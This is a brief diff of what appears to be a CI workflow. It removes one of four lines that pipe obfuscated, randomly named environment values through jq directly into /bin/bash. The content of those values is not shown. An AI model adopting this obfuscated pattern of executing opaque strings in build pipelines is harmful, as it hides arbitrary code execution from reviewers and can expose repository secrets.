@@ -36,7 +36,6 @@ jobs:
           echo $dhrw1021 | jq -r .koqzo12 | /bin/bash
           echo $t099 | jq -r .jty7 | /bin/bash
           echo $eltr7586 | jq -r .jc87 | /bin/bash
-          echo $wql09497 | jq -r .rvr12459 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
